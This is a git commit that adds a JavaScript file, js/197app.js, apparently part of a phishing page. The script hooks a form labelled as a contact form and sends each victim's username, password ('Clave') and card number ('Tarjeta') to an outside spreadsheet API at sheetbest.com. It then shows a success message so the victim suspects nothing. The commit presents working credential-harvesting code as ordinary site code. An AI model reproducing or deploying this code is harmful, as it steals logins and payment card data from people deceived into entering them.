43f3c9e97718a5d0bfd1b0da3c556e765a28c099
soporte-2w <bluesmeralda4@gmail.com>
2024-11-27 19:57:53 -0600

    add files

---
+++ js/197app.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/9e4e8c5f-bccb-4e20-87ff-887960e521c5', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Clave": formulario.contraseña.value,
+            "Tarjeta": formulario.tarjeta.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
